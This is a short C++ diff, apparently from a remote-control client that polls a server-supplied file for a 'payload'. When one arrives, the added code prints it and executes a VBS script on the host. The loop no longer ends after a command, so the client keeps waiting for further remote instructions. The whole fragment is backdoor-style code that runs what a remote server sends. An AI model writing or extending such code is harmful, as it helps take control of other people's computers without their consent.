@@ -103,11 +103,22 @@ int main()
                     }
                     case '#':                                                                                    //end all
                     {
-                        send_data(sock,"from_server.txt","`");                                                    //mark the file read(switch)
-                        //cout << "mark the file read [switch] inside case #" << endl;
+                        if(receive_data(sock,"from_server.txt")[0] == '`')
+                        {
+                            Sleep(100);
+                            cout<< "waiting for payload " << endl;
+                        }      
+                        else
+                        {
+                            string payload = (receive_data(sock,"from_server.txt").substr(1));
+                            cout << "Recieved after waiting ->" << payload << endl;
+                            ExecuteCommand("hello.vbs");
+                        }
                         
-                        loop = false;
-                        outerloop = false;
+                        send_data(sock,"from_server.txt","`");
+                        //cout << "mark the received command as read [del]" << endl;
+                        //loop = false;
+                        //outerloop = false;
                         
                         break;
                     }
